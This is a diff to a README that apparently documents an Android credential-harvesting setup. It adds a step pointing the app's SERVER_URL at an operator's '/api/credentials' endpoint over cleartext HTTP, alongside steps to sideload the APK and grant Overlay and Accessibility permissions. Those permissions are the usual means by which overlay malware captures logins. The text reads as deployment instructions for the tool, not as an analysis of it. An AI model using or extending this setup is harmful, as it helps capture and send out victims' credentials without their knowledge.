@@ -370,13 +370,30 @@ def admin_view():
    SERVER_PORT=5000
    ```
 
-3. **Android Application**
+3. **Network Configuration**
+   Update the server IP address in the Android application:
+   
+   **In `Constants.kt`:**
+   ```kotlin
+   const val SERVER_URL = "http://YOUR_SERVER_IP:5000/api/credentials"
+   ```
+   
+   **In `network_security_config.xml`:**
+   ```xml
+   <domain-config cleartextTrafficPermitted="true">
+       <domain includeSubdomains="false">YOUR_SERVER_IP</domain>
+   </domain-config>
+   ```
+   
+   Replace `YOUR_SERVER_IP` with your actual server IP address (e.g., `192.168.1.47`)
+
+4. **Android Application**
    - Enable "Install from Unknown Sources"
    - Install the APK package
    - Grant required permissions (Overlay, Accessibility)
-   - Configure network settings for server communication
+   - Ensure target device and server are on the same network
 
-4. **Permission Configuration**
+5. **Permission Configuration**
    ```kotlin
    // Request overlay permission
    if (!Settings.canDrawOverlays(this)) {
